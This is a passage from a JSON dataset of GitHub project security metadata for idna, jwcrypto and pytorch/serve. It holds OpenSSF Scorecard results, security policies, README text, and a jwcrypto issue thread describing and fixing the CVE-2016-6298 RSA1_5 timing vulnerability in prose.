new\nmodule name.\n\nExceptions\n----------\n\nAll errors raised during the conversion following the specification\nshould raise an exception derived from the ``idna.IDNAError`` base\nclass.\n\nMore specific exceptions that may be generated as ``idna.IDNABidiError``\nwhen the error reflects an illegal combination of left-to-right and\nright-to-left characters in a label; ``idna.InvalidCodepoint`` when\na specific codepoint is an illegal character in an IDN label (i.e.\nINVALID); and ``idna.InvalidCodepointContext`` when the codepoint is\nillegal based on its positional context (i.e. it is CONTEXTO or CONTEXTJ\nbut the contextual requirements are not satisfied.)\n\nBuilding and Diagnostics\n------------------------\n\nThe IDNA and UTS 46 functionality relies upon pre-calculated lookup\ntables for performance. These tables are derived from computing against\neligibility criteria in the respective standards. These tables are\ncomputed using the command-line script ``tools/idna-data``.\n\nThis tool will fetch relevant codepoint data from the Unicode repository\nand perform the required calculations to identify eligibility. There are\nthree main modes:\n\n* ``idna-data make-libdata``. Generates ``idnadata.py`` and\n  ``uts46data.py``, the pre-calculated lookup tables used for IDNA and\n  UTS 46 conversions. Implementers who wish to track this library against\n  a different Unicode version may use this tool to manually generate a\n  different version of the ``idnadata.py`` and ``uts46data.py`` files.\n\n* ``idna-data make-table``. Generate a table of the IDNA disposition\n  (e.g. PVALID, CONTEXTJ, CONTEXTO) in the format found in Appendix\n  B.1 of RFC 5892 and the pre-computed tables published by `IANA\n  <https://www.iana.org/>`_.\n\n* ``idna-data U+0061``. Prints debugging output on the various\n  properties associated with an individual Unicode codepoint (in this\n  case, U+0061), that are used to assess the IDNA and UTS 46 status of a\n  codepoint. This is helpful in debugging or analysis.\n\nThe tool accepts a number of arguments, described using ``idna-data\n-h``. Most notably, the ``--version`` argument allows the specification\nof the version of Unicode to be used in computing the table data. For\nexample, ``idna-data --version 9.0.0 make-libdata`` will generate\nlibrary data against Unicode 9.0.0.\n\n\nAdditional Notes\n----------------\n\n* **Packages**. The latest tagged release version is published in the\n  `Python Package Index <https://pypi.org/project/idna/>`_.\n\n* **Version support**. This library supports Python 3.6 and higher.\n  As this library serves as a low-level toolkit for a variety of\n  applications, many of which strive for broad compatibility with older\n  Python versions, there is no rush to remove older interpreter support.\n  Removing support for older versions should be well justified in that the\n  maintenance burden has become too high.\n\n* **Python 2**. Python 2 is supported by version 2.x of this library.\n  Use \"idna<3\" in your requirements file if you need this library for\n  a Python 2 application. Be advised that these versions are no longer\n  actively developed.\n\n* **Testing**. The library has a test suite based on each rule of the\n  IDNA specification, as well as tests that are provided as part of the\n  Unicode Technical Standard 46, `Unicode IDNA Compatibility Processing\n  <https://unicode.org/reports/tr46/>`_.\n\n* **Emoji**. It is an occasional request to support emoji domains in\n  this library. Encoding of symbols like emoji is expressly prohibited by\n  the technical standard IDNA 2008 and emoji domains are broadly phased\n  out across the domain industry due to associated security risks. For\n  now, applications that need to support these non-compliant labels\n  may wish to consider trying the encode/decode operation in this library\n  first, and then falling back to using `encodings.idna`. See `the Github\n  project <https://github.com/kjd/idna/issues/18>`_ for more discussion.\n",
        "num_commits": 351,
        "project_age_days": 4173,
        "project_created_at": "2013-05-27",
        "latest_updated_at": "2024-10-19",
        "latest_pushed_at": "2024-09-16",
        "num_contributors": 23,
        "num_pull": 99,
        "num_issues": 197,
        "num_opening_issue": 5,
        "project_size(kB)": 1036,
        "num_stargazers": 247,
        "num_watchers": 247,
        "num_forks": 91,
        "num_subscribers": 15,
        "SecurityPolicy_created_at": "2023-05-31 20:07:58",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "e004fd2773fe316cacd666c34e7299a709f3583f",
                "url": "https://github.com/kjd/idna/commit/e004fd2773fe316cacd666c34e7299a709f3583f",
                "date": "2023-11-23 03:40:48"
            },
            {
                "commit_id": "2611cd4eacb59ad9f8cbd51d0c8c70a1ad4e81ad",
                "url": "https://github.com/kjd/idna/commit/2611cd4eacb59ad9f8cbd51d0c8c70a1ad4e81ad",
                "date": "2023-05-31 20:07:58"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "latchset/jwcrypto",
        "project_url": "https://github.com/latchset/jwcrypto",
        "SSF": {
            "date": "2024-10-29T19:46:47+07:00",
            "repo": {
                "name": "github.com/latchset/jwcrypto",
                "commit": "f105494e9c7ff203dcaf378676b4df7f7463e500"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "14 out of 16 merged PRs checked by a CI test -- score normalized to 8",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 7/24 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: python contributor org/company found, freeipa contributor org/company found, dogtagpki contributor org/company found, python-ldap contributor org/company found, red hat contributor org/company found, latchset contributor org/company found, red hat inc contributor org/company found, zopefoundation contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 8 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: GNU Lesser General Public License v3.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish-to-pypi.yml:11"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:95: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:74: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ppc64le.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/ppc64le.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ppc64le.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/ppc64le.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-pypi.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/publish-to-pypi.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-pypi.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/publish-to-pypi.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-to-pypi.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/latchset/jwcrypto/publish-to-pypi.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:105",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish-to-pypi.yml:28",
                        "Info:   0 out of   9 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   2 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 17 commits out of 22 are checked with a SAST tool"
                    ],
                    "score": 9,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Warn: no linked content found",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 4,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v1.5.6 not signed: https://api.github.com/repos/latchset/jwcrypto/releases/145131236",
                        "Warn: release artifact v1.5.5 not signed: https://api.github.com/repos/latchset/jwcrypto/releases/144938572",
                        "Warn: release artifact v1.5.4 not signed: https://api.github.com/repos/latchset/jwcrypto/releases/141837401",
                        "Warn: release artifact v1.5.2 not signed: https://api.github.com/repos/latchset/jwcrypto/releases/140369236",
                        "Warn: release artifact v1.5.6 does not have provenance: https://api.github.com/repos/latchset/jwcrypto/releases/145131236",
                        "Warn: release artifact v1.5.5 does not have provenance: https://api.github.com/repos/latchset/jwcrypto/releases/144938572",
                        "Warn: release artifact v1.5.4 does not have provenance: https://api.github.com/repos/latchset/jwcrypto/releases/141837401",
                        "Warn: release artifact v1.5.2 does not have provenance: https://api.github.com/repos/latchset/jwcrypto/releases/140369236"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:31",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:32",
                        "Warn: no topLevel permission defined: .github/workflows/build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ppc64le.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-to-pypi.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-3ww4-gg4f-jr7f",
                        "Warn: Project is vulnerable to: GHSA-5cpq-8wj7-hf2v",
                        "Warn: Project is vulnerable to: GHSA-9v9h-cgj8-h64p",
                        "Warn: Project is vulnerable to: GHSA-jfhm-5ghh-2f97 / PYSEC-2023-254",
                        "Warn: Project is vulnerable to: GHSA-jm77-qphf-c4w8",
                        "Warn: Project is vulnerable to: GHSA-v8gr-m533-ghj9",
                        "Warn: Project is vulnerable to: GHSA-w7pp-m8wf-vj6r",
                        "Warn: Project is vulnerable to: GHSA-x4qr-2fvf-3mr5"
                    ],
                    "score": 2,
                    "reason": "8 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/latchset/jwcrypto/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 1.5.1+  | :white_check_mark: |\n| < 1.5.1 | :x:                |\n\n## Reporting a Vulnerability\n\nPlease use the GitHub feature to report security vulnerabilities.\n\nExpect a response within 2 business days (not on week ends or holidays).\n\nIf the vulnerbaility is confirmed and accepted you will be given instruction on any embargo or disclosure timeline.\n",
        "project_all_labels": [
            "bug",
            "CVE",
            "dcumentation",
            "duplicate",
            "Easy Fix",
            "enhancement",
            "help wanted",
            "invalid",
            "Priority",
            "question",
            "Security Issue",
            "WIP",
            "wontfix"
        ],
        "README_content": "[![PyPI](https://img.shields.io/pypi/v/jwcrypto.svg)](https://pypi.org/project/jwcrypto/)\n[![Changelog](https://img.shields.io/github/v/release/latchset/jwcrypto?label=changelog)](https://github.com/latchset/jwcrypto/releases)\n[![Build Status](https://github.com/latchset/jwcrypto/actions/workflows/build.yml/badge.svg)](https://github.com/latchset/jwcrypto/actions/workflows/build.yml)\n[![ppc64le Build](https://github.com/latchset/jwcrypto/actions/workflows/ppc64le.yml/badge.svg)](https://github.com/latchset/jwcrypto/actions/workflows/ppc64le.yml)\n[![Code Scan](https://github.com/latchset/jwcrypto/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/latchset/jwcrypto/actions/workflows/codeql-analysis.yml)\n[![Documentation Status](https://readthedocs.org/projects/jwcrypto/badge/?version=latest)](https://jwcrypto.readthedocs.io/en/latest/?badge=latest)\n\nJWCrypto\n========\n\nAn implementation of the JOSE Working Group documents:\n- RFC 7515 - JSON Web Signature (JWS)\n- RFC 7516 - JSON Web Encryption (JWE)\n- RFC 7517 - JSON Web Key (JWK)\n- RFC 7518 - JSON Web Algorithms (JWA)\n- RFC 7519 - JSON Web Token (JWT)\n- RFC 7520 - Examples of Protecting Content Using JSON Object Signing and\n  Encryption (JOSE)\n\nInstallation\n============\n\n    pip install jwcrypto\n\nDocumentation\n=============\n\nhttp://jwcrypto.readthedocs.org\n\nDeprecation Notices\n===================\n\n2020.12.11: The RSA1_5 algorithm is now considered deprecated due to numerous\nimplementation issues that make it a very problematic tool to use safely.\nThe algorithm can still be used but requires explicitly allowing it on object\ninstantiation. If your application depends on it there are examples of how to\nre-enable RSA1_5 usage in the tests files.\n\nNote: if you enable support for `RSA1_5` and the attacker can send you chosen\nciphertext and is able to measure the processing times of your application,\nthen your application will be vulnerable to a Bleichenbacher RSA padding\noracle, allowing the so-called \"Million messages attack\". That attack allows\nto decrypt intercepted messages (even if they were encrypted with RSA-OAEP) or\nforge signatures (both RSA-PKCS#1 v1.5 and RSASSA-PSS).\n\nGiven JWT is generally used in tokens to sign authorization assertions or to\nencrypt private key material, this is a particularly severe issue, and must\nnot be underestimated.\n",
        "num_commits": 330,
        "project_age_days": 3527,
        "project_created_at": "2015-03-04",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-07-08",
        "num_contributors": 36,
        "num_pull": 185,
        "num_issues": 338,
        "num_opening_issue": 8,
        "project_size(kB)": 726,
        "num_stargazers": 437,
        "num_watchers": 437,
        "num_forks": 118,
        "num_subscribers": 19,
        "SecurityPolicy_created_at": "2021-06-09 19:02:52",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "066d13f2dbac3c0be7aa2a3023189980d56b86ab",
                "url": "https://github.com/latchset/jwcrypto/commit/066d13f2dbac3c0be7aa2a3023189980d56b86ab",
                "date": "2023-12-26 19:46:36"
            },
            {
                "commit_id": "82518c945ecf8ff01d2a578521eede91755f1e22",
                "url": "https://github.com/latchset/jwcrypto/commit/82518c945ecf8ff01d2a578521eede91755f1e22",
                "date": "2021-06-09 19:02:52"
            }
        ],
        "project_security_labels": [
            "Security Issue",
            "CVE"
        ],
        "security_issues": [
            {
                "url": "https://github.com/latchset/jwcrypto/pull/66",
                "title": "Fix for CVE-2016-6298",
                "labels": [
                    "Security Issue",
                    "CVE"
                ],
                "user": "simo5",
                "issue_author_association": "MEMBER",
                "number": 66,
                "id": 174170925,
                "state": "closed",
                "project_created_at": "2016-08-31T02:36:02Z",
                "closed_at": "2016-08-31T19:38:42Z",
                "body": "This fixes the security issue reported in #65 \n",
                "comments": [
                    {
                        "body": "I'm not fully convinced that the mitigation removes all timing variations. It's almost impossible to write constant timing code in Python. Heck, it's even extremely hard in C.\n\nHow about we mark PKCS1v15, NULL and other bad algos as insecure and not offer them by default? I have an idea to make the registry more flexible.\n",
                        "user": "tiran",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2016-08-31T08:01:58Z",
                        "url": "https://github.com/latchset/jwcrypto/pull/66#issuecomment-243688706"
                    },
                    {
                        "body": "We can't remove all timing variations but that is not the point, we just need to avoid big enough variations to be measurable over the network. Different messages already cause different timings on their own.\nIt makes no sense to remove RSA1_5 because we have a mitigation and the vulnerability is usage specific, it is only present if an attacker can capture messages and use a server as an oracle. There are perfectly valid uses of this algorithm and it is mandated by the standard,\n",
                        "user": "simo5",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2016-08-31T13:24:42Z",
                        "url": "https://github.com/latchset/jwcrypto/pull/66#issuecomment-243762543"
                    },
                    {
                        "body": "This patch looks pretty good to me. It's a great idea to always throw an exception: My test cases showed great results with this fix and I believe the difference in timing is negligible over the network.\n\nI agree, that RSA 1.5 is not the best algorithm to support, but as Simo already mentioned, it's necessary to support it in order to be compliant with the specification.\nI guess, there are some discussions about deprecating this algorithm though...\n\nThanks for your fast reaction in fixing this, Simo! It was a pleasure!\n",
                        "user": "Merenon",
                        "issue_author_association": "NONE",
                        "project_created_at": "2016-08-31T18:36:48Z",
                        "url": "https://github.com/latchset/jwcrypto/pull/66#issuecomment-243859071"
                    },
                    {
                        "body": "@simo5 I'm working on backporting the fix to Ubuntu 16.04 (0.2.1). Could you possibly share your tests for the issue so I can write a unit test and confirm the backported fix works?\r\n\r\nhttps://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-6298.html",
                        "user": "rokclimb15",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-09-14T20:36:57Z",
                        "url": "https://github.com/latchset/jwcrypto/pull/66#issuecomment-329601742"
                    },
                    {
                        "body": "@rokclimb15 all the tests I have are in the TestMMA function in the second commit of this PR.\r\nHTH",
                        "user": "simo5",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-14T20:57:16Z",
                        "url": "https://github.com/latchset/jwcrypto/pull/66#issuecomment-329606810"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/latchset/jwcrypto/pulls/66",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/latchset/jwcrypto/issues/65",
                "title": "CVE-2016-6298: Million Messages Attack vulnerability",
                "labels": [
                    "Security Issue",
                    "CVE"
                ],
                "user": "simo5",
                "issue_author_association": "MEMBER",
                "number": 65,
                "id": 174170727,
                "state": "closed",
                "project_created_at": "2016-08-31T02:34:07Z",
                "closed_at": "2016-08-31T19:38:42Z",
                "body": "The jwcrypto implementation of the RSA1_5 algorithm is vulnerable to the Million Message Attack described in [RFC 3128](https://www.ietf.org/rfc/rfc3218.txt).\n\nA timing attack can be leveraged against the implementation to detect when a chosed ciphertext generates a valid header and padding because invalid headr/padding generates a code exception and cryptographic operations are terminated earlier resulting in measurably faster processing over the network.\n\nMany thanks to Dennis Detering dennis.detering@rub.de for discovering and reporting this vulnerability.\n",
                "comments": [],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 2,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "pytorch/serve",
        "project_url": "https://github.com/pytorch/serve",
        "SSF": {
            "date": "2024-10-29T21:51:10+07:00",
            "repo": {
                "name": "github.com/pytorch/serve",
                "commit": "f4fbcbe33c1279797884b23ad1229d90f4d54d1d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.5,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: frontend/gradle/wrapper/gradle-wrapper.jar:1",
                        "Warn: binary detected: plugins/gradle/wrapper/gradle-wrapper.jar:1",
                        "Warn: binary detected: serving-sdk/.mvn/wrapper/maven-wrapper.jar:1"
                    ],
                    "score": 7,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'release_0.4.2'",
                        "Warn: branch protection not enabled for branch 'release_0.4.1'",
                        "Warn: branch protection not enabled for branch 'patch_release_0_3_1'",
                        "Warn: branch protection not enabled for branch 'release/0.3.0'",
                        "Warn: branch protection not enabled for branch 'release/0.2.0'",
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is required - but no codeowners file found in repo",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: meta ai pytorch contributor org/company found, mlcommons contributor org/company found, Hugging-Face-Supporter contributor org/company found, gpu-mode contributor org/company found, awsdocs contributor org/company found, cucapra contributor org/company found, pytorch contributor org/company found, fairinternal contributor org/company found, amazon web services contributor org/company found, meta inc contributor org/company found, persistent systems contributor org/company found, intel contributor org/company found, facebookresearch contributor org/company found, llm-efficiency-challenge contributor org/company found, aws contributor org/company found, facebook contributor org/company found, pytorch-labs contributor org/company found, meta contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 18 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
